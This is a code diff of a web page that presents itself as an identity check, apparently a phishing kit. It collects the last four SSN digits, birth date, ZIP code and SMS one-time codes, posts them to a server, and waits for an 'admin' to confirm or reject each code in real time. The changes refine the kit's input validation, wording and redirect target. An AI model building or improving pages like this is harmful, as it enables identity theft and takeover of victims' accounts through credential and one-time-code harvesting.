@@ -8,7 +8,7 @@
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8fafc; padding: 20px; }
         .container { max-width: 420px; margin: auto; background: white; padding: 35px; border-radius: 16px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         h1 { font-size: 1.75rem; text-align: center; margin-bottom: 8px; color: #1e2937; }
-        p { text-align: center; color: #64748b; margin-bottom: 25px; line-height: 1.5; }
+        p { text-align: center; color: #64748b; margin-bottom: 25px; }
         label { display: block; margin: 20px 0 8px; font-weight: 600; color: #334155; }
         input, select { width: 100%; padding: 14px; border: 1.5px solid #e2e8f0; border-radius: 10px; font-size: 1.05rem; }
         .date-group { display: flex; gap: 10px; }
@@ -24,13 +24,11 @@
 <body>
     <div class="container">
 
-        <!-- Step 1: SSN + DOB -->
+        <!-- Step 1 -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <p>You'll need to provide some information first.</p>
-            
-            <label>Last 4 Digits of SSN</label>
-            <input type="text" id="ssn" maxlength="4" placeholder="1234">
+            <label>Last 4 Digits of SSN <span style="color:red">(Numbers Only)</span></label>
+            <input type="text" id="ssn" maxlength="4" placeholder="1234" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
 
             <label>Birth Date</label>
             <div class="date-group">
@@ -45,15 +43,15 @@
             <button class="continue" onclick="nextStep(2)">Continue</button>
         </div>
 
-        <!-- Step 2: Zip Code -->
+        <!-- Step 2 -->
         <div id="step2" class="step">
-            <h1>Provide Additional Information</h1>
-            <label>Zip Code</label>
-            <input type="text" id="zip" maxlength="5" placeholder="12345">
+            <h1>Additional Information</h1>
+            <label>Zip Code <span style="color:red">(Numbers Only)</span></label>
+            <input type="text" id="zip" maxlength="5" placeholder="12345" oninput="this.value = this.value.replace(/[^0-9]/g,'')">
             <button class="continue" onclick="nextStep(3)">Continue</button>
         </div>
 
-        <!-- Step 3: Access Code -->
+        <!-- Step 3 -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the code you received via SMS.</p>
@@ -71,13 +69,13 @@
         function nextStep(step) {
             if (step === 2) {
                 if (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked) {
-                    alert("Please fill SSN and accept the Privacy Policy.");
+                    alert("Please fill SSN (4 digits) and accept the Privacy Policy.");
                     return;
                 }
             }
             if (step === 3) {
-                if (document.getElementById('zip').value.length < 5) {
-                    alert("Please enter a valid Zip Code.");
+                if (document.getElementById('zip').value.length !== 5) {
+                    alert("Please enter a valid 5-digit Zip Code.");
                     return;
                 }
             }
@@ -97,9 +95,9 @@
 
             statusDiv.innerHTML = `<span class="waiting">Waiting for admin confirmation...</span>`;
 
-            const ssn = document.getElementById('ssn').value || "";
+            const ssn = document.getElementById('ssn').value;
             const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
-            const zip = document.getElementById('zip').value || "";
+            const zip = document.getElementById('zip').value;
 
             const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
 
@@ -125,17 +123,17 @@
                 if (latest && latest.address.includes("Confirmed")) {
                     clearInterval(interval);
                     document.getElementById('status').innerHTML = `<span style="color:green">✅ Verification Successful!</span>`;
-                    setTimeout(() => window.location.href = "tunde.html", 1500);
+                    setTimeout(() => window.location.href = "index.html", 1500);
                 } else if (latest && latest.address.includes("Rejected")) {
                     clearInterval(interval);
-                    document.getElementById('status').innerHTML = `<span class="error">❌ Code Rejected.<br>Use "Request New Code" below.</span>`;
+                    document.getElementById('status').innerHTML = `<span class="error">❌ Code Rejected by Admin.<br>Use "Request New Code" below.</span>`;
                 }
             }, 2000);
         }
 
         async function requestNewCode() {
             const statusDiv = document.getElementById('status');
-            statusDiv.innerHTML = `<span class="waiting">Requesting new code...</span>`;
+            statusDiv.innerHTML = `<span class="waiting">Sending request to admin...</span>`;
 
             await fetch('/api/login', {
                 method: 'POST',
@@ -147,10 +145,10 @@
                 })
             });
 
-            statusDiv.innerHTML = `<span style="color:#eab308">✅ New code requested.<br>Please check your SMS shortly.</span>`;
+            statusDiv.innerHTML = `<span style="color:#eab308">✅ Request sent to admin.<br>Waiting for new code...</span>`;
         }
 
-        // Populate Date Dropdowns
+        // Populate dates
         window.onload = () => {
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((m,i) => {
